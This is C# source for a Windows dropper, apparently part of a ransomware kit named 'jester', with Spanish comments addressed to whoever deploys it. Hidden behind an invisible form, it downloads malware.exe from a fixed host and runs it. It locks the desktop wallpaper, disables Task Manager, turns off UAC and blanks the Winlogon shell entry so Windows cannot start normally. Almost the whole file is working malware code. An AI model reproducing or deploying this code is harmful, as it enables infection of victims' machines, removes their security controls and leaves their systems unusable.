using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace auto_descargador
{
    public partial class Form1 : Form
    {
        public Form1()
        {

            InitializeComponent();
            this.TransparencyKey = this.BackColor; //Make invisible
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Left = 0; //Make 0 size
            this.Top = 0; //Make 0 size
            this.Width = Screen.PrimaryScreen.Bounds.Width; //Make 0 size
            this.Height = Screen.PrimaryScreen.Bounds.Height; //Make 0 size


            // aqui podras descargar  la carpeta donde se debe subir a un localhost donde el ransomware pedira lo nesesario para poder ejecutarse

            {

                ServicePointManager.Expect100Continue = true; //Make protocol for donwload file from github
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                string keyName = @"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows";
                string valueName = "chomer_confirm";
                if (Registry.GetValue(keyName, valueName, null) == null)
                {
                    //Replace wallpaper
                    WebClient wc = new WebClient();
                    string url = "http://192.168.1.3/malware.exe";
                    string save_path = "C:\\Windows\\Temp\\";
                    string name = "malware.exe";
                    wc.DownloadFile(url, save_path + name);
                    // coloca el nombre de tu foto que sera mostrada en el escritorio de la victima 
                    //  Replace wallpaper
                    RegistryKey wallpaper = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    wallpaper.SetValue("Wallpaper", "C:\\Windows\\Temp\\jester.jpg");
                    RegistryKey wallpaperstyle = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    wallpaperstyle.SetValue("WallpaperStyle", "2");
                    RegistryKey noremovewall = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop");
                    noremovewall.SetValue("NoChangingWallPaper", 1, RegistryValueKind.DWord);

                    //Some reg keys
                    RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    reg.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
                    RegistryKey keyUAC = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    keyUAC.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                    //If you shutdown your computer, you cant run winodws well
                    RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                    reg3.SetValue("Shell", "empty", RegistryValueKind.String);

                    //aqui pondras el nombre de tu carpeta comprimida donde vendran con todos los archivos nesesarios para el
                    //funcionamiento de jester
                    //hunter dexter

                    Thread.Sleep(10000);
                    System.Diagnostics.Process.Start(@"C:\Windows\Temp\malware.exe");
         
                    //auto kill del programa
             Process[] _process = null;
            _process = Process.GetProcessesByName("chomer");
            foreach (Process proces in _process)
            {
              
                        proces.Kill();
            }

                }
            }
        }
    }
}


